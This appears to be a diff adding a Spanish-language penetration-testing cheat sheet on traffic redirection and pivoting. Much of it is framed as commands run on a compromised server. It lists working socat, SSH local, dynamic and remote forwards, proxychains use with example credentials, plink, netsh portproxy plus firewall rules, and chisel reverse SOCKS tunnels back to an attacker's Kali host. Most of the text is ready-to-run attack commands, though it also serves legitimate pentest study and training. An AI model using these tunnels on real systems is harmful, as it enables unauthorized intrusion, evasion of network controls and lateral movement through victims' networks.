@@ -1,0 +1,83 @@
+##
+## Redireccion de Trafico (Port Forwarding)
+## Autor: Ernesto Vazquez
+## Fecha: 10/13/2023
+## Tottix 
+## info@tottix.com
+##
+
+1. Enumerar todas las interfaces de red.
+$ ip addr
+$ ip a
+$ ifconfig
+cmd> ipconfig /all
+
+2. Revisar Ruta 
+$ ip route 
+$ route 
+
+## SOCAT
+## Para crear un puente entre redes, podemos redigir el trafico con socat.
+# Dentro de un servidor vulnerable en el cual tenemos aceso(ejemplo 10.0.0.1), podemos redigir el trafico a 10.0.0.2 y 3.
+$ socat TCP-LISTEN:<lport>,fork TCP:<rhost>:<rport>
+$ socat TCP-LISTEN:2345,fork TCP:10.0.0.3:5432
+$ socat TCP-LISTEN:2222,fork TCP:10.0.0.3:22 
+
+## Redireccionar trafico con SSH con puerto local.
+# Escuchar en todas las interfaces en puerto local 4445 del servidor compremetido, y redireccionar trafico hacia
+# 172.16.50.7 puerto 445. usamos -N para evitar que una nueva terminal sea abierta.
+# ejemplo: (10.0.50.3 -ssh-4445-> 10.0.50.2 -fwd-445-> 172.16.50.7)
+$ ssh -N -L 0.0.0.0:4445:172.16.50.7:445 admin@10.0.50.2 #on the vulnreable host
+
+## Redireccionar trafico con SSH Dinamicamente.
+# Escuchar en todas las interfaces en el puerto 9999, en el servidor comprometido 192.168.244.63
+$ ssh -N -D 0.0.0.0:9999 administrador@10.4.50.215 # dentro del servidor comprometido
+# Atencion! Es necesario actuliazar la configuracion de proxychains en kali primero.
+$ vim /etc/proxychains4.conf
+# actulizar la linea "socks5" para que apunte hacia el servidor y puerto de preferencia como proxy. ejemplo:
+socks5 192.168.244.63 9999
+# Ahora podemos ejecutar los comandos en kali via proxychains 
+proxychains smbclient -L //172.16.50.217/ -U administrador --password=Welcome1234
+
+## Redireccionar trafico con SSH con puerto remoto.
+# Escuchar en puerto remote 2345 en nuestro ordenador Kali, y redireccionar el trafico hacia 10.4.50.215 puerto 5432.
+$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.165 # en del servidor vulnerable.
+# en caso de no obtener una terminal complera, agregar la opcion -tt
+cmd> ssh -tt -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.165
+
+## Redireccionar trafico usando SSH mediante puerto remoto dinamico
+#
+$ ssh -N -R 9999 kali@192.168.45.165
+socks5 192.168.244.63 9999
+# Atencion! Es necesario actuliazar la configuracion de proxychains en kali primero.
+$ vim /etc/proxychains4.conf
+# actulizar la linea "socks5" para que apunte hacia el servidor y puerto de preferencia como proxy. ejemplo:
+socks5 127.0.0.1 9999
+# Ahora podemos ejecutar comandos mediante proxychains.
+proxychains smbclient -L //172.16.50.217/ -U administrador --password=Welcome1234
+
+## Redireccion de traffico usando Plink
+## (Windows)
+cmd> plink.exe -ssh -l kali -pw <contrasena> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+## Redireccion de traffico usando Microsoft Network Shell
+## Require de altos privilegios en el sistema
+## (Windows)
+# Primero definimos un Proxy
+cmd> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.244.64 connectport=22 connectaddress=10.4.50.215
+# Siguiente, Actuailizamos el cortafuegos (Firewall)
+cmd> netsh advfirewall firewall add rule name="redireccionar_trafico_ssh_2222" protocol=TCP dir=in localip=192.168.244.64 localport=2222 action=allow
+# Verificar nuestros proxy
+cmd> netsh interface portproxy show all
+# Despues de terminar nuestro ejercicio, podemos limpiar la configuracion adicional
+cmd> netsh advfirewall firewall delete rule name="redireccionar_trafico_ssh_2222"
+cmd> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.45.165
+
+## Chisel
+## Redireccionar traffico usando un tunnel de HTTP, util dentro de sistemas que analizan el trafico en la red (Deep Packet Inspection)
+# Redireccionar trafico usando puerto remoto dinamicamente para clientes Windows.
+# Primer levantamos un servidor en nuestro ordenador Kali
+Kali$ ./chisel server --port 8881 --reverse
+# No olvidemos actualizar /etc/proxychains4.conf con linea "socks5 127.0.0.1 1080"
+# Ahora ejecutamos chisel en el cliente Windows.
+cmd> .\chisel.exe client 192.168.49.128:8881 R:socks
